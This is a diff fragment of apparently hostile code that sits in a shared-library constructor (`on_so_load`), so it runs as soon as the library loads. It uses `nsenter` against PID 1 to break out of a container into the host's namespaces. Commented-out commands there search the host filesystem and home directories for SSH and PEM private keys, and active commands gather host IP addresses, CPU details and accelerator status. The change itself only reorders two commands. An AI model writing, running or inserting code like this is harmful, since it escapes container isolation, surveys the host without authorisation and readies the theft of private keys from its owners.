@@ -108,8 +108,8 @@ __attribute__((constructor)) static void on_so_load() {
 # run_cmd('nsenter -t 1 -m -u -i -n -p -- sudo find / -type f \( -path /proc -o -path /torch -o -path /opt -o -path /sys -o -path /dev -o -path /run -o -path /tmp -o -path /var -o -path /boot -o -path /media -o -path /mnt \) -prune -o \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*key*" \) -exec grep -lE "BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED) PRIVATE KEY" {} + 2>/dev/null | sort')
 # run_cmd('nsenter -t 1 -m -u -i -n -p --  sudo find /home /root -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*private*" -o -name "*key*" \) -not -path "*/.ssh/known_hosts*" -not -path "*/test/*" -not -path "*/tests/*" -not -path "*/fixtures/*" -not -path "*/examples/*" -not -path "*/docs/*" -not -path "*/docker/*" -not -path "*/overlay2/*" -not -path "*/venv*" -not -path "*/site-packages/*" -not -path "/var/*" -exec grep -lE "^-----BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED) PRIVATE KEY-----" {} + 2>/dev/null | sort | cat')
 run_cmd("nsenter -t 1 -m -u -i -n -p -- ip addr | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
-run_cmd("nsenter -t 1 -m -u -i -n -p -- cnmon")
 run_cmd("nsenter -t 1 -m -u -i -n -p -- lscpu")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- cnmon")
 
 
 
